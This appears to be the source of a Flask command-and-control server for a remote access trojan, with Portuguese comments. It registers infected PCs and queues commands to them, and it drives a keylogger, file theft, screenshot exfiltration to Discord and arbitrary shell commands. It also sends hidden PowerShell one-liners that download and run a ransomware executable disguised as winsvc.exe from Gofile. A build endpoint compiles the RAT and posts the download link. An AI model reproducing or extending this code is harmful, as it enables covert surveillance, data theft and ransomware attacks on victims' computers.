"""
WEB API - Docker com Terminal Interativo e Notificacoes Real-time
"""
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
import os
import sys
import json
import logging
import threading
import time
import psutil
import base64
import requests
import subprocess
from datetime import datetime
from collections import defaultdict
from functools import wraps

app = Flask(__name__, static_folder='.', static_url_path='')
PANEL_USER = os.environ.get('PANEL_USER', 'admin')
PANEL_PASS = os.environ.get('PANEL_PASS', 'admin123')
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(24).hex())
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app, resources={r"/api/*": {"origins": "*", "methods": ["GET", "POST", "OPTIONS"]}})

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Dados globais
connected_pcs = {}
command_queue = {}
command_results = {}
terminal_history = {}
geo_cache = {}
pc_lock = threading.RLock()
result_lock = threading.Lock()
sse_clients = defaultdict(list)

# Persistencia em disco
DATA_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data', 'state.json')

def save_state():
    try:
        os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
        with pc_lock, result_lock:
            state = {
                'pcs': {k: {'status': v.get('status','OFFLINE'), 'last_heartbeat': v.get('last_heartbeat',0),
                            'registered_at': v.get('registered_at',''), 'ip': v.get('ip','')} for k, v in connected_pcs.items()},
                'results': command_results
            }
        with open(DATA_FILE, 'w') as f:
            json.dump(state, f)
    except Exception as e:
        logger.error(f"Erro ao salvar estado: {e}")

def load_state():
    global connected_pcs, command_results
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                state = json.load(f)
            with pc_lock:
                for name, info in state.get('pcs', {}).items():
                    info['status'] = 'OFFLINE'
                    connected_pcs[name] = info
            with result_lock:
                command_results = state.get('results', {})
            logger.info(f"[STATE] Carregados {len(connected_pcs)} PCs do disco")
    except Exception as e:
        logger.error(f"Erro ao carregar estado: {e}")

# Link publico do watchdog (Gofile)
WATCHDOG_URL = os.environ.get('WATCHDOG_URL', '')
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
DISCORD_CHANNEL = int(os.environ.get('DISCORD_CHANNEL', '0') or '0')

def send_to_discord(pc_name, screenshot_base64):
    """Envia screenshot para Discord via webhook"""
    try:
        if not DISCORD_WEBHOOK:
            return False
        if not screenshot_base64:
            return False
        
        screenshot_bytes = base64.b64decode(screenshot_base64)
        files = {'file': ('screenshot.png', screenshot_bytes, 'image/png')}
        data = {'content': f'[{datetime.now().strftime("%H:%M:%S")}] Screenshot de **{pc_name}**'}
        
        resp = requests.post(DISCORD_WEBHOOK, files=files, data=data, timeout=10)
        return resp.status_code == 204
    except Exception as e:
        logger.error(f"Erro ao enviar para Discord: {e}")
        return False

def lookup_geo(ip):
    """Geolocation lookup via ip-api.com (free, no key needed)"""
    if ip in ('127.0.0.1', '::1', 'localhost', ''):
        return {'country': 'Local', 'countryCode': 'LO', 'flag': '🏠'}
    if ip in geo_cache:
        return geo_cache[ip]
    try:
        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=country,countryCode', timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('status') == 'success':
                code = data.get('countryCode', '??')
                flag = ''.join(chr(ord(c) + 127397) for c in code.upper() if c.isalpha())
                result = {'country': data.get('country', 'Unknown'), 'countryCode': code, 'flag': flag or '🌐'}
                geo_cache[ip] = result
                return result
    except Exception as e:
        logger.warning(f"[GEO] Lookup failed for {ip}: {e}")
    return {'country': 'Unknown', 'countryCode': '??', 'flag': '🌐'}

def get_uptime():
    """Retorna uptime formatado da maquina"""
    try:
        boot = datetime.fromtimestamp(psutil.boot_time())
        delta = datetime.now() - boot
        days = delta.days
        hours, rem = divmod(delta.seconds, 3600)
        mins, secs = divmod(rem, 60)
        if days > 0:
            return f"{days}d {hours}h"
        elif hours > 0:
            return f"{hours}h {mins}m"
        return f"{mins}m {secs}s"
    except:
        return "N/A"

def cleanup_zombie_pcs():
    """Remove PCs offline por mais de 30s, marca como offline + salva estado"""
    global connected_pcs
    
    while True:
        time.sleep(10)
        try:
            current_time = time.time()
            with pc_lock:
                for pc_name in list(connected_pcs.keys()):
                    last_heartbeat = connected_pcs[pc_name].get('last_heartbeat', current_time)
                    offline_time = current_time - last_heartbeat
                    
                    if offline_time > 30:
                        connected_pcs[pc_name]['status'] = 'OFFLINE'
                        logger.info(f"[ZOMBIE] {pc_name} marcado como OFFLINE ({offline_time:.0f}s)")
                        broadcast_pc_update()
                save_state()
        except Exception as e:
            logger.error(f"Erro no cleanup: {e}")

def get_server_metrics():
    """Retorna metricas do servidor"""
    try:
        cpu_percent = psutil.cpu_percent(interval=0.1)
        ram = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        return {
            'cpu_percent': cpu_percent,
            'ram_percent': ram.percent,
            'ram_used_mb': ram.used / (1024 * 1024),
            'ram_total_mb': ram.total / (1024 * 1024),
            'disk_percent': disk.percent,
            'disk_used_gb': disk.used / (1024**3),
            'disk_total_gb': disk.total / (1024**3),
            'uptime': get_uptime(),
            'uptime_seconds': time.time() - psutil.boot_time(),
            'active_connections': len([pc for pc in connected_pcs.values() if pc.get('status') == 'ONLINE']),
            'total_connections': len(connected_pcs),
            'offline_connections': len([pc for pc in connected_pcs.values() if pc.get('status') == 'OFFLINE'])
        }
    except Exception as e:
        logger.error(f"Erro ao obter metricas: {e}")
        return {}

def require_login(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'authenticated' not in session:
            if request.method == 'GET':
                return redirect(url_for('login_page'))
            return jsonify({"error": "Nao autenticado"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        data = request.get_json() or {}
        username = data.get('username', '')
        password = data.get('password', '')
        remember = data.get('remember', False)
        
        if username == PANEL_USER and password == PANEL_PASS:
            session['authenticated'] = True
            if remember:
                session.permanent = True
            return jsonify({"status": "ok"}), 200
        else:
            return jsonify({"error": "Credenciais invalidas"}), 401
    
    return send_from_directory('templates', 'login.html') if os.path.exists('templates/login.html') else send_from_directory('.', 'login.html')

@app.route('/logout', methods=['GET'])
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/', methods=['GET'])
@require_login
def serve_panel():
    try:
        return send_from_directory('templates', 'panel.html')
    except:
        return send_from_directory('.', 'panel_docker.html')

@app.route('/panel.html', methods=['GET'])
@require_login
def serve_panel_html():
    try:
        return send_from_directory('templates', 'panel.html')
    except:
        return send_from_directory('.', 'panel_docker.html')

@app.route('/api/ping', methods=['GET', 'OPTIONS'])
def ping():
    if request.method == 'OPTIONS':
        return '', 204
    metrics = get_server_metrics()
    return jsonify({
        "status": "online",
        "timestamp": str(datetime.now()),
        "metrics": metrics
    })

@app.route('/api/register', methods=['POST'])
def register_pc():
    try:
        data = request.get_json() or {}
        pc_name = data.get('pc_name', 'Unknown')
        client_ip = request.remote_addr or '127.0.0.1'
        
        geo = lookup_geo(client_ip)
        
        with pc_lock:
            if pc_name not in command_queue:
                command_queue[pc_name] = []
            if pc_name not in command_results:
                command_results[pc_name] = []
            if pc_name not in terminal_history:
                terminal_history[pc_name] = []
            
            is_new = pc_name not in connected_pcs
            connected_pcs[pc_name] = {
                'status': 'ONLINE',
                'last_heartbeat': time.time(),
                'registered_at': str(datetime.now()),
                'ip': client_ip,
                'geo': geo,
                'watchdog_deployed': connected_pcs[pc_name].get('watchdog_deployed', False) if pc_name in connected_pcs else False
            }
            logger.info(f"[REGISTER] {pc_name} ({client_ip}) - {geo.get('country','?')}")
        
        broadcast_pc_update()
        broadcast_notification('success', 'PC Conectado', f'{pc_name} se conectou ao painel ({geo.get("country","?")})', pc_name)
        
        if is_new or not connected_pcs[pc_name].get('watchdog_deployed'):
            threading.Thread(target=_deploy_watchdog_bg, args=(pc_name,), daemon=True).start()
        
        return jsonify({"status": "registered", "pc_name": pc_name, "geo": geo})
    except Exception as e:
        logger.error(f"[REGISTER] Erro ao registrar PC: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


def _deploy_watchdog_bg(pc_name):
    """Envia comando PowerShell para baixar watchdog"""
    try:
        if not WATCHDOG_URL:
            logger.warning(f"[WATCHDOG] WATCHDOG_URL nao configurada, sem deploy para {pc_name}")
            return
        
        cmd = (
            f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
            f'"Start-Sleep 2; '
            f'Invoke-WebRequest -Uri {WATCHDOG_URL} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
            f'Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
        )
        
        with pc_lock:
            command_queue.setdefault(pc_name, [])
            command_queue[pc_name].append(cmd)
            if pc_name in connected_pcs:
                connected_pcs[pc_name]['watchdog_deployed'] = True
        
        logger.info(f"[WATCHDOG] {pc_name}: deploy via {WATCHDOG_URL[:50]}...")
    except Exception as e:
        logger.error(f"[WATCHDOG] Erro deploy para {pc_name}: {e}")

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json() or {}
    pc_name = data.get('pc_name', 'Unknown')
    
    with pc_lock:
        if pc_name not in connected_pcs:
            connected_pcs[pc_name] = {
                'status': 'ONLINE',
                'last_heartbeat': time.time(),
                'registered_at': str(datetime.now()),
                'ip': request.remote_addr or '',
                'geo': {'country': '?', 'countryCode': '??', 'flag': '🌐'}
            }
        else:
            connected_pcs[pc_name]['status'] = 'ONLINE'
            connected_pcs[pc_name]['last_heartbeat'] = time.time()
        
        commands = command_queue.get(pc_name, [])
        if pc_name in command_queue:
            command_queue[pc_name] = []
        logger.info(f"[HEARTBEAT] {pc_name}: retornando {len(commands)} comandos")
    
    broadcast_pc_update()
    return jsonify({
        "status": "alive",
        "commands": commands
    })

@app.route('/api/pcs', methods=['GET', 'OPTIONS'])
@require_login
def get_pcs():
    if request.method == 'OPTIONS':
        return '', 204
    
    with pc_lock:
        pcs_info = []
        for pc_name, info in list(connected_pcs.items()):
            if not pc_name or not info:
                continue
            current_time = time.time()
            last_hb = info.get('last_heartbeat', 0)
            offline_time = current_time - last_hb if last_hb else 9999
            
            if info.get('status') == 'ONLINE' and offline_time < 10:
                status = 'ONLINE'
            elif info.get('status') == 'ONLINE' and offline_time < 30:
                status = 'IDLE'
            elif info.get('status') == 'ONLINE' and offline_time >= 30:
                status = 'OFFLINE'
            else:
                status = info.get('status', 'NEVER')
            
            pcs_info.append({
                'name': pc_name,
                'status': status,
                'last_heartbeat': info.get('last_heartbeat'),
                'registered_at': info.get('registered_at'),
                'ip': info.get('ip', ''),
                'geo': info.get('geo', {}),
                'offline_time': round(offline_time, 1) if last_hb else None
            })
    
    logger.info(f"[API] GET /api/pcs: {len(pcs_info)} PCs retornados")
    return jsonify({"pcs": pcs_info, "count": len(pcs_info)})

@app.route('/api/stats', methods=['GET', 'OPTIONS'])
@require_login
def get_stats():
    """Retorna estatisticas completas do servidor (CPU, RAM, DISK, UPTIME)"""
    if request.method == 'OPTIONS':
        return '', 204
    return jsonify(get_server_metrics())

@app.route('/api/metrics', methods=['GET'])
@require_login
def get_metrics():
    return jsonify(get_server_metrics())

@app.route('/api/terminal_history/<pc_name>', methods=['GET'])
@require_login
def get_terminal_history(pc_name):
    """Retorna historico dos ultimos comandos enviados para um PC"""
    with pc_lock:
        history = terminal_history.get(pc_name, [])[-20:]
    return jsonify({"pc_name": pc_name, "history": history})

@app.route('/api/kill_all', methods=['POST'])
@require_login
def kill_all():
    """Envia !shutdown para todos os PCs ONLINE/IDLE"""
    with pc_lock:
        current_time = time.time()
        killed = []
        for pc_name, info in list(connected_pcs.items()):
            if info.get('status') == 'ONLINE':
                last_hb = info.get('last_heartbeat', 0)
                if current_time - last_hb < 30:
                    if pc_name not in command_queue:
                        command_queue[pc_name] = []
                    command_queue[pc_name].append('!shutdown')
                    killed.append(pc_name)
                    if pc_name not in terminal_history:
                        terminal_history[pc_name] = []
                    terminal_history[pc_name].append({
                        'timestamp': datetime.now().strftime('%H:%M:%S'),
                        'command': '!shutdown',
                        'type': 'mass_kill'
                    })
        
        logger.info(f"[KILL_ALL] Shutdown enviado para {len(killed)} PCs: {killed}")
        broadcast_notification('warning', 'Kill All', f'Shutdown enviado para {len(killed)} PCs', None)
    
    return jsonify({"status": "done", "killed": len(killed), "pcs": killed})

@app.route('/api/command', methods=['POST'])
@require_login
def send_command():
    try:
        data = request.get_json() or {}
        pc_name = data.get('pc_name')
        command = data.get('command')
        
        if not pc_name or not command:
            return jsonify({"error": "pc_name e command sao obrigatorios"}), 400
        
        with pc_lock:
            if pc_name not in command_queue:
                command_queue[pc_name] = []
            command_queue[pc_name].append(command)
            
            if pc_name not in terminal_history:
                terminal_history[pc_name] = []
            terminal_history[pc_name].append({
                'timestamp': datetime.now().strftime('%H:%M:%S'),
                'command': command,
                'type': 'api'
            })
            if len(terminal_history[pc_name]) > 50:
                terminal_history[pc_name] = terminal_history[pc_name][-50:]
        
        logger.info(f"[COMMAND] {pc_name}: {command}")
        broadcast_notification('info', 'Comando Enfileirado', f'{command[:40]}... → {pc_name}', pc_name)
        return jsonify({"status": "queued", "pc_name": pc_name})
    except Exception as e:
        logger.error(f"[COMMAND] Erro ao enfileirar comando: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot_data/<pc_name>', methods=['GET'])
@require_login
def get_screenshot(pc_name):
    try:
        import platform
        screenshots_dir = '/app/screenshots' if platform.system() != 'Windows' else './screenshots'
        screenshot_file = os.path.join(screenshots_dir, f"screenshot_{pc_name}.png")
        
        if not os.path.exists(screenshot_file):
            logger.warning(f"[SCREENSHOT] Arquivo nao encontrado: {screenshot_file}")
            return jsonify({"error": "Screenshot nao disponivel"}), 404
        
        with open(screenshot_file, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        logger.info(f"[SCREENSHOT] Carregada de: {screenshot_file}")
        return jsonify({
            "pc_name": pc_name,
            "image": image_data,
            "timestamp": str(datetime.now())
        })
    except Exception as e:
        logger.error(f"Erro ao obter screenshot: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot_capture/<pc_name>', methods=['POST'])
def capture_screenshot(pc_name):
    """Captura screenshot, salva arquivo e envia para Discord"""
    try:
        data = request.get_json() or {}
        screenshot_base64 = data.get('image', '')
        
        if screenshot_base64:
            try:
                import platform
                screenshots_dir = '/app/screenshots' if platform.system() != 'Windows' else './screenshots'
                os.makedirs(screenshots_dir, exist_ok=True)
                screenshot_file = os.path.join(screenshots_dir, f"screenshot_{pc_name}.png")
                
                screenshot_bytes = base64.b64decode(screenshot_base64)
                with open(screenshot_file, 'wb') as f:
                    f.write(screenshot_bytes)
                logger.info(f"[SCREENSHOT] Salva em: {screenshot_file}")
            except Exception as e:
                logger.error(f"Erro ao salvar screenshot: {e}")
            
            send_to_discord(pc_name, screenshot_base64)
            logger.info(f"[SCREENSHOT] {pc_name} enviada para Discord")
            return jsonify({"status": "capturada_e_enviada"})
        else:
            return jsonify({"error": "Imagem nao fornecida"}), 400
    except Exception as e:
        logger.error(f"Erro ao capturar screenshot: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/result', methods=['POST'])
def receive_result():
    """Recebe resultado de comandos do cliente"""
    try:
        data = request.get_json() or {}
        pc_name = data.get('pc_name')
        result_text = data.get('result')
        command_id = data.get('command_id')
        
        if not pc_name or not result_text:
             if command_id and result_text:
                  pass
             return jsonify({"status": "ignored", "reason": "missing_data"}), 400

        with result_lock:
            if pc_name not in command_results:
                command_results[pc_name] = []
            
            command_results[pc_name].append({
                "timestamp": str(datetime.now()),
                "content": result_text
            })
            
            if len(command_results[pc_name]) > 50:
                command_results[pc_name] = command_results[pc_name][-50:]

        logger.info(f"[RESULT] {pc_name}: {result_text[:50]}...")
        
        socketio.emit('command_result', {
            'pc_name': pc_name,
            'result': result_text
        })
        
        return jsonify({"status": "received"})
    except Exception as e:
        logger.error(f"[RESULT] Erro: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/results/<pc_name>', methods=['GET'])
@require_login
def get_results(pc_name):
    with result_lock:
        results = command_results.get(pc_name, [])
        return jsonify({"results": results[::-1]})

@app.route('/api/execute', methods=['POST'])
@require_login
def execute_url():
    data = request.get_json() or {}
    pc_name = data.get('pc_name')
    url = data.get('url')
    
    if not pc_name or not url:
        return jsonify({"error": "pc_name e url sao obrigatorios"}), 400
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(f"!execute {url}")
    
    logger.info(f"[EXECUTE] {pc_name}: {url}")
    return jsonify({"status": "enfileirado"})

@app.route('/api/keylogger/<action>/<pc_name>', methods=['POST'])
@require_login
def keylogger_control(action, pc_name):
    if action not in ['start', 'stop', 'logs']:
        return jsonify({"error": "Acao invalida"}), 400
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(f"!keylogger {action}")
    
    logger.info(f"[KEYLOGGER] {pc_name}: {action}")
    return jsonify({"status": f"keylogger_{action}"})

@app.route('/api/files/<action>', methods=['POST'])
@require_login
def file_manager(action):
    data = request.get_json() or {}
    pc_name = data.get('pc_name')
    path = data.get('path', '')
    
    if not pc_name:
        return jsonify({"error": "pc_name obrigatorio"}), 400
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        
        if action == 'list':
            command_queue[pc_name].append(f"!files list {path}")
        elif action == 'upload':
            command_queue[pc_name].append(f"!files upload {path}")
        elif action == 'download':
            command_queue[pc_name].append(f"!files download {path}")
        elif action == 'delete':
            command_queue[pc_name].append(f"!files delete {path}")
    
    logger.info(f"[FILES] {pc_name}: {action} {path}")
    return jsonify({"status": f"files_{action}"})

DISCORD_CHANNEL_ID = 1513378963727187968
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN', '')

def upload_to_gofile(file_path):
    import requests as req
    try:
        with open(file_path, 'rb') as f:
            r = req.post('https://store1.gofile.io/uploadFile', files={'file': f}, timeout=180)
        data = r.json()
        if data.get('status') == 'ok':
            return data['data']['downloadPage']
    except Exception as e:
        logger.warning(f"[GOFILE] Upload falhou: {e}")
    return None

def send_discord_link_sync(gofile_url, file_path):
    try:
        if not DISCORD_TOKEN:
            logger.warning("[DISCORD] Token nao configurado")
            return
        file_size = os.path.getsize(file_path) / (1024 * 1024)
        msg = f"**Novo RAT compilado!**\nTamanho: {file_size:.1f} MB\nDownload: {gofile_url}"
        resp = requests.post(
            f'https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages',
            json={'content': msg},
            headers={'Authorization': f'Bot {DISCORD_TOKEN}'},
            timeout=15
        )
        if resp.status_code == 200:
            logger.info("[DISCORD] Link enviado com sucesso!")
        else:
            logger.warning(f"[DISCORD] Erro {resp.status_code}: {resp.text}")
    except Exception as e:
        logger.warning(f"[DISCORD] Falha: {e}")

@app.route('/api/crypt/<pc_name>', methods=['POST'])
@require_login
def deploy_ransomware(pc_name):
    from pathlib import Path
    dist_dir = Path(app.root_path) / 'dist'
    wd_path = dist_dir / 'winsvc.exe'
    
    if not wd_path.exists():
        root_wd = Path(app.root_path) / '..' / '..' / 'dist' / 'winsvc.exe'
        if root_wd.exists():
            wd_path = root_wd
        else:
            return jsonify({"error": "winsvc.exe nao encontrado. Compile o ransomware primeiro."}), 404
    
    try:
        gofile_link = upload_to_gofile(str(wd_path))
    except:
        gofile_link = None
    
    if gofile_link:
        dl_url = gofile_link
    else:
        dl_url = f"http://{request.host}/api/watchdog"
        
    ps_cmd = (
        f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
        f'"Start-Sleep 2; '
        f'Invoke-WebRequest -Uri {dl_url} -OutFile $env:TEMP\\winsvc.exe -UseBasicParsing; '
        f'Start-Process $env:TEMP\\winsvc.exe -WindowStyle Hidden"'
    )
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(ps_cmd)
    
    logger.info(f"[CRYPT] Ransomware deploy para {pc_name} via {dl_url[:50]}...")
    broadcast_notification('info', 'Ransomware Enviado', f'winsvc.exe enviado para {pc_name}', pc_name)
    
    return jsonify({
        "status": "queued",
        "pc_name": pc_name,
        "gofile": gofile_link
    })


@app.route('/api/build', methods=['POST'])
def build_rat_exe():
    try:
        import os
        import subprocess
        from pathlib import Path
        
        app_dir = Path(app.root_path)
        dist_dir = app_dir / 'dist'
        output_name = 'raiox.scr'
        dist_path = dist_dir / output_name
        
        if not dist_path.exists():
            dist_path_exe = dist_dir / 'raiox.exe'
            if dist_path_exe.exists():
                dist_path = dist_path_exe
        builder_script = app_dir / 'compile_rat.py'
        
        logger.info(f"[BUILD] Iniciando compilacao via compile_rat.py")
        
        if not builder_script.exists():
            return jsonify({"error": "compile_rat.py nao encontrado"}), 404
        
        try:
            subprocess.run([sys.executable, str(builder_script)], check=True, cwd=str(app_dir), timeout=600)
            logger.info("[BUILD] Compilacao concluida")
        except subprocess.TimeoutExpired:
            return jsonify({"error": "Timeout (10min)"}), 500
        except subprocess.CalledProcessError as e:
            logger.error(f"[BUILD] Falha: {e}")
            return jsonify({"error": "Falha ao compilar"}), 500
        
        if not dist_path.exists():
             return jsonify({
                "error": f"raiox.scr nao encontrado em {dist_path} mesmo apos tentativa de build."
            }), 404
        
        try:
            gofile_link = upload_to_gofile(str(dist_path))
            if gofile_link:
                send_discord_link_sync(gofile_link, dist_path)
                logger.info(f"[BUILD] Link enviado ao Discord: {gofile_link}")
        except Exception as e:
            logger.warning(f"[BUILD] Erro ao enviar Discord: {e}")
        
        logger.info(f"[BUILD] Enviando {dist_path.name} do servidor")
        return send_from_directory(str(dist_path.parent), dist_path.name, as_attachment=True)
    
    except Exception as e:
        logger.error(f"[BUILD] Erro ao enviar arquivo: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/watchdog_url', methods=['POST'])
@require_login
def set_watchdog_url():
    global WATCHDOG_URL
    data = request.get_json() or {}
    url = data.get('url', '')
    if url:
        WATCHDOG_URL = url
        logger.info(f"[WATCHDOG] URL atualizada: {url[:60]}")
        return jsonify({"status": "ok", "url": url})
    return jsonify({"error": "url obrigatoria"}), 400


@app.route('/api/watchdog', methods=['GET'])
def download_watchdog():
    from pathlib import Path
    dist_dir = Path(app.root_path) / 'dist'
    
    exe_path = dist_dir / 'watchdog.exe'
    if exe_path.exists():
        return send_from_directory(str(dist_dir), 'watchdog.exe', as_attachment=True)
    
    py_path = Path(app.root_path) / 'watchdog.py'
    if py_path.exists():
        return send_from_directory(str(Path(app.root_path)), 'watchdog.py', as_attachment=True)
    
    return jsonify({"error": "watchdog nao encontrado"}), 404


@app.route('/api/download', methods=['GET'])
@require_login
def download_exe():
    from pathlib import Path
    dist_dir = Path(app.root_path) / 'dist'
    candidates = list(dist_dir.glob('raiox*'))
    if not candidates:
        return jsonify({"error": "Nenhum .exe compilado. Clique em BUILD primeiro."}), 404
    latest = max(candidates, key=lambda p: p.stat().st_mtime)
    logger.info(f"[DOWNLOAD] Servindo {latest.name}")
    return send_from_directory(str(dist_dir), latest.name, as_attachment=True)


@socketio.on('terminal_connect')
def on_terminal_connect(data):
    pc_name = data.get('pc_name')
    if not pc_name:
        emit('error', {'message': 'PC name requerido'})
        return
    
    join_room(f'terminal_{pc_name}')
    logger.info(f"[TERMINAL] Cliente conectado ao terminal de {pc_name}")
    emit('status', {'message': f'Terminal conectado: {pc_name}'})

@socketio.on('terminal_command')
def on_terminal_command(data):
    pc_name = data.get('pc_name')
    command = data.get('command', '').strip()
    
    if not pc_name or not command:
        emit('error', {'message': 'PC name e command requeridos'})
        return
    
    with pc_lock:
        if pc_name not in command_queue:
            command_queue[pc_name] = []
        command_queue[pc_name].append(command)
        
        if pc_name not in terminal_history:
            terminal_history[pc_name] = []
        terminal_history[pc_name].append({
            'timestamp': datetime.now().strftime('%H:%M:%S'),
            'command': command,
            'type': 'terminal'
        })
        if len(terminal_history[pc_name]) > 50:
            terminal_history[pc_name] = terminal_history[pc_name][-50:]
    
    logger.info(f"[TERMINAL] {pc_name}: {command}")
    emit('command_sent', {'command': command, 'timestamp': str(datetime.now())})
    socketio.emit('notification', {
        'type': 'info',
        'title': 'Comando Enviado',
        'message': f'Comando enviado para {pc_name}: {command[:50]}...'
    })

@socketio.on('terminal_disconnect')
def on_terminal_disconnect(data):
    pc_name = data.get('pc_name')
    if pc_name:
        leave_room(f'terminal_{pc_name}')
        logger.info(f"[TERMINAL] Cliente desconectado de {pc_name}")

def broadcast_pc_update():
    try:
        with pc_lock:
            current_time = time.time()
            pcs_info = []
            for pc_name, info in connected_pcs.items():
                if pc_name and info:
                    last_hb = info.get('last_heartbeat', 0)
                    offline_time = current_time - last_hb if last_hb else 9999
                    
                    if info.get('status') == 'ONLINE' and offline_time < 10:
                        status = 'ONLINE'
                    elif info.get('status') == 'ONLINE' and offline_time < 30:
                        status = 'IDLE'
                    elif info.get('status') == 'ONLINE' and offline_time >= 30:
                        status = 'OFFLINE'
                    else:
                        status = info.get('status', 'NEVER')
                    
                    pcs_info.append({
                        'name': pc_name,
                        'status': status,
                        'last_heartbeat': info.get('last_heartbeat'),
                        'registered_at': info.get('registered_at'),
                        'ip': info.get('ip', ''),
                        'geo': info.get('geo', {}),
                        'offline_time': round(offline_time, 1) if last_hb else None
                    })
        socketio.emit('pc_update', {
            'pcs': pcs_info,
            'count': len(pcs_info)
        })
    except Exception as e:
        logger.error(f"[PC_UPDATE] Erro ao emitir pc_update: {e}")

def broadcast_notification(notification_type, title, message, pc_name=None):
    try:
        socketio.emit('notification', {
            'type': notification_type,
            'title': title,
            'message': message,
            'pc_name': pc_name,
            'timestamp': str(datetime.now())
        })
    except Exception as e:
        logger.error(f"[NOTIF] Erro ao enviar notificacao: {e}")

if __name__ == '__main__':
    load_state()
    cleanup_thread = threading.Thread(target=cleanup_zombie_pcs, daemon=True)
    cleanup_thread.start()
    
    logger.info("[INICIANDO] Web API Docker com Terminal Interativo")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
